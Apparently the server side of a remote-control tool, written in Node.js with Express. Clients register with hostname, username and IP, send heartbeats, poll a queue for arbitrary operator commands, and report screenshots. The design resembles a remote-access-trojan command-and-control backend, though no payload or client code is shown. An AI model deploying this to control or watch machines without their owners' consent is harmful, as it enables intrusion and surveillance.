
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs-extra');
const path = require('path');
const http = require('http');

// Initialize Express app
const app = express();
const server = http.createServer(app);

// Set up middleware
app.use(cors());
app.use(bodyParser.json());

// In-memory storage for clients
const clients = {};
const clientCommands = {};

// Ensure data directory exists
const dataDir = path.join(__dirname, '../../data');
fs.ensureDirSync(dataDir);
fs.ensureDirSync(path.join(dataDir, 'screenshots'));
fs.ensureDirSync(path.join(dataDir, 'downloads'));

// API Routes
const apiRouter = express.Router();

// Get all registered clients
apiRouter.get('/clients', (req, res) => {
  const clientList = Object.values(clients);
  res.json(clientList);
});

// Register or update a client
apiRouter.post('/clients/register', (req, res) => {
  const { id, hostname, username, os, ip } = req.body;
  
  if (!id || !hostname) {
    return res.status(400).json({ error: 'Missing required fields' });
  }
  
  // Create or update client
  clients[id] = {
    id,
    hostname,
    username,
    os,
    ip: ip || req.ip,
    status: 'online',
    lastSeen: new Date().toISOString(),
    categoryId: clients[id]?.categoryId || ""
  };
  
  // Initialize command queue if it doesn't exist
  if (!clientCommands[id]) {
    clientCommands[id] = [];
  }
  
  res.json({ success: true, client: clients[id] });
});

// Update client status
apiRouter.post('/clients/:id/heartbeat', (req, res) => {
  const { id } = req.params;
  
  if (clients[id]) {
    clients[id].lastSeen = new Date().toISOString();
    clients[id].status = 'online';
    res.json({ success: true });
  } else {
    res.status(404).json({ error: 'Client not found' });
  }
});

// Get pending commands for a client
apiRouter.get('/clients/:id/commands', (req, res) => {
  const { id } = req.params;
  
  if (!clientCommands[id]) {
    clientCommands[id] = [];
  }
  
  const commands = clientCommands[id];
  clientCommands[id] = []; // Clear commands after retrieving
  
  res.json({ commands });
});

// Send command to client
apiRouter.post('/clients/:id/commands', (req, res) => {
  const { id } = req.params;
  const { type, payload } = req.body;
  
  if (!type) {
    return res.status(400).json({ error: 'Command type is required' });
  }
  
  if (!clientCommands[id]) {
    clientCommands[id] = [];
  }
  
  const command = {
    id: Date.now().toString(),
    type,
    payload: payload || '',
    timestamp: new Date().toISOString()
  };
  
  clientCommands[id].push(command);
  
  res.json({ success: true, command });
});

// Handle screenshot upload
apiRouter.post('/clients/:id/screenshot', (req, res) => {
  // This would handle file uploads in a real implementation
  // For this example, we're just acknowledging the request
  const { id } = req.params;
  
  if (clients[id]) {
    clients[id].lastScreenshot = `/screenshots/${id}_${Date.now()}.jpg`;
    res.json({ success: true, screenshotPath: clients[id].lastScreenshot });
  } else {
    res.status(404).json({ error: 'Client not found' });
  }
});

// Mount API router
app.use('/api', apiRouter);

// Serve static files from the React app in production
if (process.env.NODE_ENV === 'production') {
  app.use(express.static(path.join(__dirname, '../../dist')));
  
  app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '../../dist', 'index.html'));
  });
}

// Start the server
const PORT = process.env.PORT || 3001;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});

// Clean up offline clients periodically
setInterval(() => {
  const now = Date.now();
  Object.keys(clients).forEach(id => {
    const lastSeen = new Date(clients[id].lastSeen).getTime();
    if (now - lastSeen > 60000) { // 1 minute timeout
      clients[id].status = 'offline';
    }
  });
}, 30000);

module.exports = server;
